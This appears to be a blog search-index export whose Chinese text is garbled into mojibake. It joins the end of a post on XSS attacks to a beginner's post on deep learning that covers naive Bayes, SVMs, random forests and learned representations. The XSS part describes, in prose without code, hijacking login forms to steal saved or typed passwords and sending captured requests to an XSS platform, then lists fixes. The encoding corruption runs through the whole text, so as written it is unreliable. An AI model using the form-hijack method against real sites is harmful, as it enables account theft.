3ã€ååˆ¶HttpOnly&emsp;&emsp;å½“å¯¹æ–¹å¼€å¯HttpOnlyæ—¶ï¼Œç›—å–cookieå°±ä¼šå¤±è´¥ã€‚ç™»å½•åå°çš„æ–¹å¼æœ‰Cookieç™»å½•å’Œè´¦å·å¯†ç ç™»å½• ï¼ˆ1ï¼‰Cookieå½¢å¼ï¼ˆ2ï¼‰ç›´æ¥è´¦å·å¯†ç ç™»å½•â‘  è¯»å–ä¿å­˜è´¦å·å¯†ç &emsp;&emsp;é€šè¿‡çªƒå–ä¿å­˜åœ¨æœ¬åœ°çš„æ•°æ®ï¼ˆè´¦å·å¯†ç ï¼‰æ¥ç™»å½•åå°ï¼ˆéœ€è¦xssäº§ç”Ÿäºç™»å½•åœ°å€ï¼Œåˆ©ç”¨è¡¨å•åŠ«æŒï¼‰ &emsp;&emsp;typeã€idã€nameé€šè¿‡æŸ¥çœ‹ç½‘ç«™æºä»£ç ä¸­çš„ç™»å½•æ¡†è¡¨å• â‘¡ è¯»å–æ²¡ä¿å­˜è´¦å·å¯†ç &emsp;&emsp;é€šè¿‡è¡¨å•ï¼ˆç™»å½•æ¡†ï¼‰åŠ«æŒæ•°æ®ï¼ˆäº§ç”Ÿåœ¨åå°çš„XSSï¼Œä¾‹å¦‚å­˜å‚¨å‹XSSç•™è¨€ç­‰ï¼‰ &emsp;&emsp;åŠ«æŒåŸç†ï¼šæŠ“å–æ•°æ®åŒ…å¦å¤–å‘é€ä¸€ä»½åˆ°è·¨ç«™å¹³å° &emsp;&emsp;ä½†æ˜¯å¦‚æœæ˜¯httpsç½‘ç«™çš„è¯ï¼Œæ•°æ®æ˜¯è¿›è¡Œäº†sslåŠ å¯†ï¼Œè·å–äº†æ•°æ®ä¹‹åä¹Ÿæ˜¯å¾ˆéš¾è¯»å–åˆ°è´¦å·å¯†ç çš„ï¼Œé¸¡è‚‹æ–¹æ³•ã€‚ ä¹ã€å®‰å…¨ä¿®å¤æ–¹æ¡ˆ å¼€å¯HttpOnly è¿‡æ»¤è¾“å…¥ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥ è¿‡æ»¤è¾“å‡ºï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰ PHPï¼ˆè¢«é˜»æ–­ï¼‰ï¼šhttp://www.zuimoge.com/212.html å…³äºXSSæ¼æ´ä¿®å¤ï¼ˆJAVAï¼‰ï¼šhttps://www.cnblogs.com/baixiansheng/p/9001522.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"XSS","permalink":"https://wolke.cn/tags/XSS/"}],"author":"w01ke"},{"title":"æ·±åº¦å­¦ä¹ åŸºç¡€â€”â€”ä»€ä¹ˆæ˜¯æ·±åº¦å­¦ä¹ ","slug":"æ·±åº¦å­¦ä¹ åŸºç¡€â€”â€”ä»€ä¹ˆæ˜¯æ·±åº¦å­¦ä¹ ","date":"2022-01-14T11:17:07.000Z","updated":"2022-01-15T07:46:23.968Z","comments":true,"path":"post/76a6120c.html","link":"","permalink":"https://wolke.cn/post/76a6120c.html","excerpt":"","text":"ä¸€ã€äººå·¥æ™ºèƒ½ã€æœºå™¨å­¦ä¹ ä¸æ·±åº¦å­¦ä¹ &emsp;&emsp;é¦–å…ˆï¼Œåœ¨æåˆ°äººå·¥æ™ºèƒ½æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®å®šä¹‰æ‰€è®¨è®ºçš„å†…å®¹ã€‚ä»€ä¹ˆæ˜¯äººå·¥æ™ºèƒ½ï¼Œæœºå™¨å­¦ä¹ ä¸æ·±åº¦å­¦ä¹ ã€‚è¿™ä¸‰è€…ä¹‹é—´æœ‰ä»€ä¹ˆå…³ç³» 1ã€äººå·¥æ™ºèƒ½ï¼ˆAIï¼‰&emsp;&emsp;äººå·¥æ™ºèƒ½çš„ç®€ä»‹å®šä¹‰å¦‚ä¸‹ï¼šåŠªåŠ›å°†é€šå¸¸ç”±äººç±»å®Œæˆçš„æ™ºèƒ½ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚ 2ã€æœºå™¨å­¦ä¹ ï¼ˆMachine Learningï¼‰&emsp;&emsp;æœºå™¨å­¦ä¹ çš„æ¦‚å¿µå°±æ¥è‡ªäºå›¾çµçš„è¿™ä¸ªé—®é¢˜ï¼šå¯¹äºè®¡ç®—æœºè€Œè¨€ï¼Œé™¤äº†â€œæˆ‘ä»¬å‘½ä»¤å®ƒåšçš„ä»»ä½•äº‹æƒ…â€ä¹‹å¤–ï¼Œå®ƒèƒ½å¦è‡ªæˆ‘å­¦ä¹ æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„æ–¹æ³•ï¼Ÿè®¡ç®—æœºèƒ½å¦è®©æˆ‘ä»¬å¤§åƒä¸€æƒŠï¼Ÿå¦‚æœæ²¡æœ‰ç¨‹åºå‘˜ç²¾å¿ƒç¼–å†™çš„æ•°æ®å¤„ç†è§„åˆ™ï¼Œè®¡ç®—æœºèƒ½å¦é€šè¿‡è§‚å¯Ÿæ•°æ®è‡ªåŠ¨å­¦ä¼šè¿™äº›è§„åˆ™ï¼Ÿ &emsp;&emsp;å›¾çµçš„è¿™ä¸ªé—®é¢˜å¼•å‡ºäº†ä¸€ç§æ–°çš„ç¼–ç¨‹èŒƒå¼ã€‚åœ¨ç»å…¸çš„ç¨‹åºè®¾è®¡ï¼ˆå³ç¬¦å·ä¸»ä¹‰äººå·¥æ™ºèƒ½çš„èŒƒå¼ï¼‰ä¸­ï¼Œäººä»¬è¾“å…¥çš„æ˜¯è§„åˆ™ï¼ˆå³ç¨‹åºï¼‰å’Œéœ€è¦æ ¹æ®è¿™äº›è§„åˆ™è¿›è¡Œå¤„ç†çš„æ•°æ®ï¼Œç³»ç»Ÿè¾“å‡ºçš„æ˜¯ç­”æ¡ˆã€‚åˆ©ç”¨æœºå™¨å­¦ä¹ ï¼Œäººä»¬è¾“å…¥çš„æ˜¯æ•°æ®å’Œä»è¿™äº›æ•°æ®ä¸­é¢„æœŸå¾—åˆ°çš„ç­”æ¡ˆï¼Œç³»ç»Ÿè¾“å‡ºçš„æ˜¯è§„åˆ™ã€‚è¿™äº›è§„åˆ™éšåå¯åº”ç”¨äºæ–°çš„æ•°æ®ï¼Œå¹¶ä½¿è®¡ç®—æœºè‡ªä¸»ç”Ÿæˆç­”æ¡ˆã€‚ &emsp;&emsp;æœºå™¨å­¦ä¹ ç³»ç»Ÿæ˜¯è®­ç»ƒå‡ºæ¥çš„ï¼Œè€Œä¸æ˜¯æ˜ç¡®åœ°ç”¨ç¨‹åºç¼–å†™å‡ºæ¥çš„ã€‚å°†ä¸æŸä¸ªä»»åŠ¡ç›¸å…³çš„è®¸å¤šç¤ºä¾‹è¾“å…¥æœºå™¨å­¦ä¹ ç³»ç»Ÿï¼Œå®ƒä¼šåœ¨è¿™äº›ç¤ºä¾‹ä¸­æ‰¾åˆ°ç»Ÿè®¡ç»“æ„ï¼Œä»è€Œæœ€ç»ˆæ‰¾åˆ°è§„åˆ™å°†ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½ æƒ³ä¸ºåº¦å‡ç…§ç‰‡æ·»åŠ æ ‡ç­¾ï¼Œå¹¶ä¸”å¸Œæœ›å°†è¿™é¡¹ä»»åŠ¡è‡ªåŠ¨åŒ–ï¼Œé‚£ä¹ˆä½ å¯ä»¥å°†è®¸å¤šäººå·¥æ‰“å¥½æ ‡ç­¾çš„ç…§ç‰‡è¾“å…¥æœºå™¨å­¦ä¹ ç³»ç»Ÿï¼Œç³»ç»Ÿå°†å­¦ä¼šå°†ç…§ç‰‡ä¸ç‰¹å®šæ ‡ç­¾è”ç³»åœ¨ä¸€èµ·çš„ç»Ÿè®¡è§„åˆ™ã€‚ ï¼ˆ1ï¼‰æ¦‚ç‡å»ºæ¨¡&emsp;&emsp;æ¦‚ç‡å»ºæ¨¡ï¼ˆprobabilistic modelingï¼‰æ˜¯ç»Ÿè®¡å­¦åŸç†åœ¨æ•°æ®åˆ†æä¸­çš„åº”ç”¨ã€‚å®ƒæ˜¯æœ€æ—©çš„æœºå™¨å­¦ä¹ å½¢å¼ä¹‹ä¸€ï¼Œè‡³ä»Šä»åœ¨å¹¿æ³›ä½¿ç”¨ã€‚å…¶ä¸­æœ€æœ‰åçš„ç®—æ³•ä¹‹ä¸€å°±æ˜¯æœ´ç´ è´å¶æ–¯ç®—æ³•ã€‚ &emsp;&emsp;æœ´ç´ è´å¶æ–¯æ˜¯ä¸€ç±»åŸºäºåº”ç”¨è´å¶æ–¯å®šç†çš„æœºå™¨å­¦ä¹ åˆ†ç±»å™¨ï¼Œå®ƒå‡è®¾è¾“å…¥æ•°æ®çš„ç‰¹å¾éƒ½æ˜¯ç‹¬ç«‹çš„ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¼ºçš„å‡è®¾ï¼Œæˆ–è€…è¯´â€œæœ´ç´ çš„â€å‡è®¾ï¼Œå…¶åç§°æ­£æ¥æºäºæ­¤ã€‚è¿™ç§æ•°æ®åˆ†ææ–¹æ³•æ¯”è®¡ç®—æœºå‡ºç°å¾—è¿˜è¦æ—©ï¼Œåœ¨å…¶ç¬¬ä¸€æ¬¡è¢«è®¡ç®—æœºå®ç°ï¼ˆå¾ˆå¯èƒ½è¿½æº¯åˆ°20ä¸–çºª50å¹´ä»£ï¼‰çš„å‡ åå¹´å‰å°±å·²ç»é äººå·¥è®¡ç®—æ¥åº”ç”¨äº†ã€‚è´å¶æ–¯å®šç†å’Œç»Ÿè®¡å­¦åŸºç¡€å¯ä»¥è¿½æº¯åˆ°18ä¸–çºªï¼Œä½ å­¦ä¼šäº†è¿™ä¸¤ç‚¹å°±å¯ä»¥å¼€å§‹ä½¿ç”¨æœ´ç´ è´å¶æ–¯åˆ†ç±»å™¨äº†ã€‚ &emsp;&emsp;å¦ä¸€ä¸ªå¯†åˆ‡ç›¸å…³çš„æ¨¡å‹æ˜¯logisticå›å½’ï¼ˆlogistic regressionï¼Œç®€ç§°logregï¼‰ï¼Œå®ƒæœ‰æ—¶è¢«è®¤ä¸ºæ˜¯ç°ä»£æœºå™¨å­¦ä¹ çš„â€œhello worldâ€ã€‚ä¸è¦è¢«å®ƒçš„åç§°æ‰€è¯¯å¯¼â€”â€”logregæ˜¯ä¸€ç§åˆ†ç±»ç®—æ³•ï¼Œè€Œä¸æ˜¯å›å½’ç®—æ³•ã€‚ä¸æœ´ç´ è´å¶æ–¯ç±»ä¼¼ï¼Œlogregçš„å‡ºç°ä¹Ÿæ¯”è®¡ç®—æœºæ—©å¾ˆé•¿æ—¶é—´ï¼Œä½†ç”±äºå®ƒæ—¢ç®€å•åˆé€šç”¨ï¼Œè‡³ä»Šä»ç„¶å¾ˆæœ‰ç”¨ã€‚é¢å¯¹ä¸€ä¸ªæ•°æ®é›†ï¼Œæ•°æ®ç§‘å­¦å®¶é€šå¸¸ä¼šé¦–å…ˆå°è¯•ä½¿ç”¨è¿™ä¸ªç®—æ³•ï¼Œä»¥ä¾¿åˆæ­¥ç†Ÿæ‚‰æ‰‹å¤´çš„åˆ†ç±»ä»»åŠ¡ã€‚ ï¼ˆ2ï¼‰æ ¸æ–¹æ³•ï¼ˆKernel Methodï¼‰&emsp;&emsp;æ ¸æ–¹æ³•æ˜¯ä¸€ç»„åˆ†ç±»ç®—æ³•ï¼Œå…¶ä¸­æœ€æœ‰åçš„å°±æ˜¯æ”¯æŒå‘é‡æœºï¼ˆSVM, support vector machineï¼‰ã€‚è™½ç„¶Vladimir Vapnikå’ŒAlexeyChervonenkisæ—©åœ¨1963å¹´å°±å‘è¡¨äº†è¾ƒæ—©ç‰ˆæœ¬çš„çº¿æ€§å…¬å¼[æ’å›¾]ï¼Œä½†SVMçš„ç°ä»£å…¬å¼ç”±Vladimir Vapnikå’ŒCorinna Cortesäº20ä¸–çºª90å¹´ä»£åˆåœ¨è´å°”å®éªŒå®¤æå‡ºï¼Œå¹¶å‘è¡¨äº1995å¹´ã€‚ &emsp;&emsp;SVMçš„ç›®æ ‡æ˜¯é€šè¿‡åœ¨å±äºä¸¤ä¸ªä¸åŒç±»åˆ«çš„ä¸¤ç»„æ•°æ®ç‚¹ä¹‹é—´æ‰¾åˆ°è‰¯å¥½å†³ç­–è¾¹ç•Œï¼ˆdecision boundaryï¼Œè§å›¾ï¼‰æ¥è§£å†³åˆ†ç±»é—®é¢˜ã€‚å†³ç­–è¾¹ç•Œå¯ä»¥çœ‹ä½œä¸€æ¡ç›´çº¿æˆ–ä¸€ä¸ªå¹³é¢ï¼Œå°†è®­ç»ƒæ•°æ®åˆ’åˆ†ä¸ºä¸¤å—ç©ºé—´ï¼Œåˆ†åˆ«å¯¹åº”äºä¸¤ä¸ªç±»åˆ«ã€‚å¯¹äºæ–°æ•°æ®ç‚¹çš„åˆ†ç±»ï¼Œä½ åªéœ€åˆ¤æ–­å®ƒä½äºå†³ç­–è¾¹ç•Œçš„å“ªä¸€ä¾§ã€‚ SVMé€šè¿‡ä¸¤æ­¥æ¥å¯»æ‰¾å†³ç­–è¾¹ç•Œã€‚ å°†æ•°æ®æ˜ å°„åˆ°ä¸€ä¸ªæ–°çš„é«˜ç»´è¡¨ç¤ºï¼Œè¿™æ—¶å†³ç­–è¾¹ç•Œå¯ä»¥ç”¨ä¸€ä¸ªè¶…å¹³é¢æ¥è¡¨ç¤ºï¼ˆå¦‚æœæ•°æ®åƒä¸Šå›¾é‚£æ ·æ˜¯äºŒç»´çš„ï¼Œé‚£ä¹ˆè¶…å¹³é¢å°±æ˜¯ä¸€æ¡ç›´çº¿ï¼‰ã€‚ å°½é‡è®©è¶…å¹³é¢ä¸æ¯ä¸ªç±»åˆ«æœ€è¿‘çš„æ•°æ®ç‚¹ä¹‹é—´çš„è·ç¦»æœ€å¤§åŒ–ï¼Œä»è€Œè®¡ç®—å‡ºè‰¯å¥½å†³ç­–è¾¹ç•Œï¼ˆåˆ†å‰²è¶…å¹³é¢ï¼‰ï¼Œè¿™ä¸€æ­¥å«ä½œé—´éš”æœ€å¤§åŒ–ï¼ˆmaximizing the marginï¼‰ã€‚è¿™æ ·å†³ç­–è¾¹ç•Œå¯ä»¥å¾ˆå¥½åœ°æ¨å¹¿åˆ°è®­ç»ƒæ•°æ®é›†ä¹‹å¤–çš„æ–°æ ·æœ¬ã€‚ &emsp;&emsp;å°†æ•°æ®æ˜ å°„åˆ°é«˜ç»´è¡¨ç¤ºä»è€Œä½¿åˆ†ç±»é—®é¢˜ç®€åŒ–ï¼Œè¿™ä¸€æŠ€å·§å¯èƒ½å¬èµ·æ¥å¾ˆä¸é”™ï¼Œä½†åœ¨å®è·µä¸­é€šå¸¸æ˜¯éš¾ä»¥è®¡ç®—çš„ã€‚è¿™æ—¶å°±éœ€è¦ç”¨åˆ°æ ¸æŠ€å·§ï¼ˆkernel trickï¼Œæ ¸æ–¹æ³•æ­£æ˜¯å› è¿™ä¸€æ ¸å¿ƒæ€æƒ³è€Œå¾—åï¼‰ã€‚å…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šè¦æƒ³åœ¨æ–°çš„è¡¨ç¤ºç©ºé—´ä¸­æ‰¾åˆ°è‰¯å¥½çš„å†³ç­–è¶…å¹³é¢ï¼Œä½ ä¸éœ€è¦åœ¨æ–°ç©ºé—´ä¸­ç›´æ¥è®¡ç®—ç‚¹çš„åæ ‡ï¼Œåªéœ€è¦åœ¨æ–°ç©ºé—´ä¸­è®¡ç®—ç‚¹å¯¹ä¹‹é—´çš„è·ç¦»ï¼Œè€Œåˆ©ç”¨æ ¸å‡½æ•°ï¼ˆkernel functionï¼‰å¯ä»¥é«˜æ•ˆåœ°å®Œæˆè¿™ç§è®¡ç®—ã€‚æ ¸å‡½æ•°æ˜¯ä¸€ä¸ªåœ¨è®¡ç®—ä¸Šèƒ½å¤Ÿå®ç°çš„æ“ä½œï¼Œå°†åŸå§‹ç©ºé—´ä¸­çš„ä»»æ„ä¸¤ç‚¹æ˜ å°„ä¸ºè¿™ä¸¤ç‚¹åœ¨ç›®æ ‡è¡¨ç¤ºç©ºé—´ä¸­çš„è·ç¦»ï¼Œå®Œå…¨é¿å…äº†å¯¹æ–°æ–°ç¤ºè¿›è¡Œç›´æ¥è®¡ç®—ã€‚æ ¸å‡½æ•°é€šå¸¸æ˜¯äººä¸ºé€‰æ‹©çš„ï¼Œè€Œä¸æ˜¯ä»æ•°æ®ä¸­å­¦åˆ°çš„â€”â€”å¯¹äºSVMæ¥è¯´ï¼Œåªæœ‰åˆ†å‰²è¶…å¹³é¢æ˜¯é€šè¿‡å­¦ä¹ å¾—åˆ°çš„ã€‚ &emsp;&emsp;SVMåˆšåˆšå‡ºç°æ—¶ï¼Œåœ¨ç®€å•çš„åˆ†ç±»é—®é¢˜ä¸Šè¡¨ç°å‡ºäº†æœ€å¥½çš„æ€§èƒ½ã€‚å½“æ—¶åªæœ‰å°‘æ•°æœºå™¨å­¦ä¹ æ–¹æ³•å¾—åˆ°å¤§é‡çš„ç†è®ºæ”¯æŒï¼Œå¹¶ä¸”é€‚åˆç”¨äºä¸¥è‚ƒçš„æ•°å­¦åˆ†æï¼Œå› è€Œéå¸¸æ˜“äºç†è§£å’Œè§£é‡Šï¼ŒSVMå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚ç”±äºSVMå…·æœ‰è¿™äº›æœ‰ç”¨çš„æ€§è´¨ï¼Œå¾ˆé•¿ä¸€æ®µæ—¶é—´é‡Œå®ƒåœ¨å®è·µä¸­éå¸¸æµè¡Œã€‚ &emsp;&emsp;ä½†æ˜¯ï¼ŒSVMå¾ˆéš¾æ‰©å±•åˆ°å¤§å‹æ•°æ®é›†ï¼Œå¹¶ä¸”åœ¨å›¾åƒåˆ†ç±»ç­‰æ„ŸçŸ¥é—®é¢˜ä¸Šçš„æ•ˆæœä¹Ÿä¸å¥½ã€‚SVMæ˜¯ä¸€ç§æ¯”è¾ƒæµ…å±‚çš„æ–¹æ³•ï¼Œå› æ­¤è¦æƒ³å°†å…¶åº”ç”¨äºæ„ŸçŸ¥é—®é¢˜ï¼Œé¦–å…ˆéœ€è¦æ‰‹åŠ¨æå–å‡ºæœ‰ç”¨çš„è¡¨ç¤ºï¼ˆè¿™å«ä½œç‰¹å¾å·¥ç¨‹ï¼‰ï¼Œè¿™ä¸€æ­¥éª¤å¾ˆéš¾ï¼Œè€Œä¸”ä¸ç¨³å®šã€‚ ï¼ˆ3ï¼‰å†³ç­–æ ‘ã€éšæœºæ£®æ—ä¸æ¢¯åº¦æå‡æœº&emsp;&emsp;å†³ç­–æ ‘ï¼ˆdecision treeï¼‰æ˜¯ç±»ä¼¼äºæµç¨‹å›¾çš„ç»“æ„ï¼Œå¯ä»¥å¯¹è¾“å…¥æ•°æ®ç‚¹è¿›è¡Œåˆ†ç±»æˆ–æ ¹æ®ç»™å®šè¾“å…¥æ¥é¢„æµ‹è¾“å‡ºå€¼ï¼ˆè§å›¾ï¼‰ã€‚å†³ç­–æ ‘çš„å¯è§†åŒ–å’Œè§£é‡Šéƒ½å¾ˆç®€å•ã€‚åœ¨21ä¸–çºªå‰åå¹´ï¼Œä»æ•°æ®ä¸­å­¦ä¹ å¾—åˆ°çš„å†³ç­–æ ‘å¼€å§‹å¼•èµ·ç ”ç©¶äººå‘˜çš„å¹¿æ³›å…³æ³¨ã€‚åˆ°äº†2010å¹´ï¼Œå†³ç­–æ ‘ç»å¸¸æ¯”æ ¸æ–¹æ³•æ›´å—æ¬¢è¿ &emsp;&emsp;ç‰¹åˆ«æ˜¯éšæœºæ£®æ—ï¼ˆrandom forestï¼‰ç®—æ³•ï¼Œå®ƒå¼•å…¥äº†ä¸€ç§å¥å£®ä¸”å®ç”¨çš„å†³ç­–æ ‘å­¦ä¹ æ–¹æ³•ï¼Œå³é¦–å…ˆæ„å»ºè®¸å¤šå†³ç­–æ ‘ï¼Œç„¶åå°†å®ƒä»¬çš„è¾“å‡ºé›†æˆåœ¨ä¸€èµ·ã€‚éšæœºæ£®æ—é€‚ç”¨äºå„ç§å„æ ·çš„é—®é¢˜â€”â€”å¯¹äºä»»ä½•æµ…å±‚çš„æœºå™¨å­¦ä¹ ä»»åŠ¡æ¥è¯´ï¼Œå®ƒå‡ ä¹æ€»æ˜¯ç¬¬äºŒå¥½çš„ç®—æ³•ã€‚å¹¿å—æ¬¢è¿çš„æœºå™¨å­¦ä¹ ç«èµ›ç½‘ç«™Kaggleåœ¨2010å¹´ä¸Šçº¿åï¼Œéšæœºæ£®æ—è¿…é€Ÿæˆä¸ºå¹³å°ä¸Šäººä»¬çš„æœ€çˆ±ï¼Œç›´åˆ°2014å¹´æ‰è¢«æ¢¯åº¦æå‡æœºæ‰€å–ä»£ã€‚ä¸éšæœºæ£®æ—ç±»ä¼¼ï¼Œæ¢¯åº¦æå‡æœºï¼ˆgradientboosting machineï¼‰ä¹Ÿæ˜¯å°†å¼±é¢„æµ‹æ¨¡å‹ï¼ˆé€šå¸¸æ˜¯å†³ç­–æ ‘ï¼‰é›†æˆçš„æœºå™¨å­¦ä¹ æŠ€æœ¯ã€‚å®ƒä½¿ç”¨äº†æ¢¯åº¦æå‡æ–¹æ³•ï¼Œé€šè¿‡è¿­ä»£åœ°è®­ç»ƒæ–°æ¨¡å‹æ¥ä¸“é—¨è§£å†³ä¹‹å‰æ¨¡å‹çš„å¼±ç‚¹ï¼Œä»è€Œæ”¹è¿›ä»»ä½•æœºå™¨å­¦ä¹ æ¨¡å‹çš„æ•ˆæœã€‚å°†æ¢¯åº¦æå‡æŠ€æœ¯åº”ç”¨äºå†³ç­–æ ‘æ—¶ï¼Œå¾—åˆ°çš„æ¨¡å‹ä¸éšæœºæ£®æ—å…·æœ‰ç›¸ä¼¼çš„æ€§è´¨ï¼Œä½†åœ¨ç»å¤§å¤šæ•°æƒ…å†µä¸‹æ•ˆæœéƒ½æ¯”éšæœºæ£®æ—è¦å¥½ã€‚å®ƒå¯èƒ½æ˜¯ç›®å‰å¤„ç†éæ„ŸçŸ¥æ•°æ®æœ€å¥½çš„ç®—æ³•ä¹‹ä¸€ï¼ˆå¦‚æœéè¦åŠ ä¸ªâ€œä¹‹ä¸€â€çš„è¯ï¼‰ã€‚å’Œæ·±åº¦å­¦ä¹ ä¸€æ ·ï¼Œå®ƒä¹Ÿæ˜¯Kaggleç«èµ›ä¸­æœ€å¸¸ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ã€‚ 3ã€ä»æ•°æ®ä¸­å­¦ä¹ è¡¨ç¤º&emsp;&emsp;ä¸ºäº†ç»™å‡ºæ·±åº¦å­¦ä¹ çš„å®šä¹‰å¹¶ææ¸…æ¥šæ·±åº¦å­¦ä¹ ä¸å…¶ä»–æœºå™¨å­¦ä¹ æ–¹æ³•çš„åŒºåˆ«ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“æœºå™¨å­¦ä¹ ç®—æ³•åœ¨åšä»€ä¹ˆã€‚å‰é¢è¯´è¿‡ï¼Œç»™å®šåŒ…å«é¢„æœŸç»“æœçš„ç¤ºä¾‹ï¼Œæœºå™¨å­¦ä¹ å°†ä¼šå‘ç°æ‰§è¡Œä¸€é¡¹æ•°æ®å¤„ç†ä»»åŠ¡çš„è§„åˆ™ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä»¥ä¸‹ä¸‰ä¸ªè¦ç´ æ¥è¿›è¡Œæœºå™¨å­¦ä¹ ã€‚ è¾“å…¥æ•°æ®ç‚¹ã€‚ä¾‹å¦‚ï¼Œä½ çš„ä»»åŠ¡æ˜¯è¯­éŸ³è¯†åˆ«ï¼Œé‚£ä¹ˆè¿™äº›æ•°æ®ç‚¹å¯èƒ½æ˜¯è®°å½•äººä»¬è¯´è¯çš„å£°éŸ³æ–‡ä»¶ã€‚å¦‚æœä½ çš„ä»»åŠ¡æ˜¯ä¸ºå›¾åƒæ·»åŠ æ ‡ç­¾ï¼Œé‚£ä¹ˆè¿™äº›æ•°æ®ç‚¹å¯èƒ½æ˜¯å›¾åƒã€‚ é¢„æœŸè¾“å‡ºçš„ç¤ºä¾‹ã€‚å¯¹äºè¯­éŸ³è¯†åˆ«ä»»åŠ¡æ¥è¯´ï¼Œè¿™äº›ç¤ºä¾‹å¯èƒ½æ˜¯äººä»¬æ ¹æ®å£°éŸ³æ–‡ä»¶æ•´ç†ç”Ÿæˆçš„æ–‡æœ¬ã€‚å¯¹äºå›¾åƒæ ‡è®°ä»»åŠ¡æ¥è¯´ï¼Œé¢„æœŸè¾“å‡ºå¯èƒ½æ˜¯â€œç‹—â€â€œçŒ«â€ä¹‹ç±»çš„æ ‡ç­¾ã€‚ è¡¡é‡ç®—æ³•æ•ˆæœå¥½åçš„æ–¹æ³•ã€‚è¿™ä¸€è¡¡é‡æ–¹æ³•æ˜¯ä¸ºäº†è®¡ç®—ç®—æ³•çš„å½“å‰è¾“å‡ºä¸é¢„æœŸè¾“å‡ºçš„å·®è·ã€‚è¡¡é‡ç»“æœæ˜¯ä¸€ç§åé¦ˆä¿¡å·ï¼Œç”¨äºè°ƒèŠ‚ç®—æ³•çš„å·¥ä½œæ–¹å¼ã€‚è¿™ä¸ªè°ƒèŠ‚æ­¥éª¤å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å­¦ä¹ ã€‚ &emsp;&emsp;æœºå™¨å­¦ä¹ æ¨¡å‹å°†è¾“å…¥æ•°æ®å˜æ¢ä¸ºæœ‰æ„ä¹‰çš„è¾“å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªä»å·²çŸ¥çš„è¾“å…¥å’Œè¾“å‡ºç¤ºä¾‹ä¸­è¿›è¡Œâ€œå­¦ä¹ â€çš„è¿‡ç¨‹ã€‚å› æ­¤ï¼Œæœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ çš„æ ¸å¿ƒé—®é¢˜åœ¨äºæœ‰æ„ä¹‰åœ°å˜æ¢æ•°æ®ï¼Œæ¢å¥è¯è¯´ï¼Œåœ¨äºå­¦ä¹ è¾“å…¥æ•°æ®çš„æœ‰ç”¨è¡¨ç¤ºï¼ˆrepresentationï¼‰â€”â€”è¿™ç§è¡¨ç¤ºå¯ä»¥è®©æ•°æ®æ›´æ¥è¿‘é¢„æœŸè¾“å‡ºã€‚åœ¨è¿›ä¸€æ­¥è®¨è®ºä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå›ç­”ä¸€ä¸ªé—®é¢˜ï¼šä»€ä¹ˆæ˜¯è¡¨ç¤ºï¼Ÿè¿™ä¸€æ¦‚å¿µçš„æ ¸å¿ƒåœ¨äºä»¥ä¸€ç§ä¸åŒçš„æ–¹å¼æ¥æŸ¥çœ‹æ•°æ®ï¼ˆå³è¡¨å¾æ•°æ®æˆ–å°†æ•°æ®ç¼–ç ï¼‰ã€‚ä¾‹å¦‚ï¼Œå½©è‰²å›¾åƒå¯ä»¥ç¼–ç ä¸ºRGBï¼ˆçº¢-ç»¿-è“ï¼‰æ ¼å¼æˆ–HSVï¼ˆè‰²ç›¸-é¥±å’Œåº¦-æ˜åº¦ï¼‰æ ¼å¼ï¼Œè¿™æ˜¯å¯¹ç›¸åŒæ•°æ®çš„ä¸¤ç§ä¸åŒè¡¨ç¤ºã€‚åœ¨å¤„ç†æŸäº›ä»»åŠ¡æ—¶ï¼Œä½¿ç”¨æŸç§è¡¨ç¤ºå¯èƒ½ä¼šå¾ˆå›°éš¾ï¼Œä½†æ¢ç”¨å¦ä¸€ç§è¡¨ç¤ºå°±ä¼šå˜å¾—å¾ˆç®€å•ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¯¹äºâ€œé€‰æ‹©å›¾åƒä¸­æ‰€æœ‰çº¢è‰²åƒç´ â€è¿™ä¸ªä»»åŠ¡ï¼Œä½¿ç”¨RGBæ ¼å¼ä¼šæ›´ç®€å•ï¼Œè€Œå¯¹äºâ€œé™ä½å›¾åƒé¥±å’Œåº¦â€è¿™ä¸ªä»»åŠ¡ï¼Œä½¿ç”¨HSVæ ¼å¼åˆ™æ›´ç®€å•ã€‚æœºå™¨å­¦ä¹ æ¨¡å‹éƒ½æ˜¯ä¸ºè¾“å…¥æ•°æ®å¯»æ‰¾åˆé€‚çš„è¡¨ç¤ºâ€”â€”å¯¹æ•°æ®è¿›è¡Œå˜æ¢ï¼Œä½¿å…¶æ›´é€‚åˆæ‰‹å¤´çš„ä»»åŠ¡ï¼ˆæ¯”å¦‚åˆ†ç±»ä»»åŠ¡ï¼‰ã€‚ &emsp;&emsp;æˆ‘ä»¬æ¥å…·ä½“è¯´æ˜è¿™ä¸€ç‚¹ã€‚è€ƒè™‘xè½´ã€yè½´å’Œåœ¨è¿™ä¸ª(x, y)åæ ‡ç³»ä¸­ç”±åæ ‡è¡¨ç¤ºçš„ä¸€äº›ç‚¹ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ 